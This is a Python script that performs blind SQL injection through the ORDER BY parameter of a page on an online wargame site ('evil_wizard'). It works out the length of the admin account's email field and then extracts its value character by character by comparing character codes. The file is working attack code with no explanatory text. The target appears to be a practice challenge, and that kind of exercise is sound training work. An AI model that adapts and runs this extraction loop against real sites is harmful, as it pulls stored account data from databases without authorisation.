import requests
import urllib.parse
import string

cookies={'PHPSESSID': ''}

hello_admin="<th>score</th><tr><td>admin"
length_pass=0
for x in range(50):
    url="https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?order="+ urllib.parse.quote("if((id='admin' and length(email)={}),0,1)".format(x))
    print(url)
    res = requests.get(url,cookies=cookies)
    #print(res.text)
    if hello_admin in res.text:
        print("Password Lenght is "+str(x))
        length_pass=x
print(length_pass)







pwd = ''


for i in range(1, length_pass+1):
    for j in range(48, 122):
        url="https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?order=" +urllib.parse.quote("if((id='admin' and ord(mid(email,{},1))={}),0,1)".format(str(i),j)) #substring(pw,1,1)=0
        print(url)
        req = requests.get(url, cookies=cookies)
        #print(pwd)
        if hello_admin in req.text:
            print(pwd)
            pwd += chr(j)
            break

print(pwd)
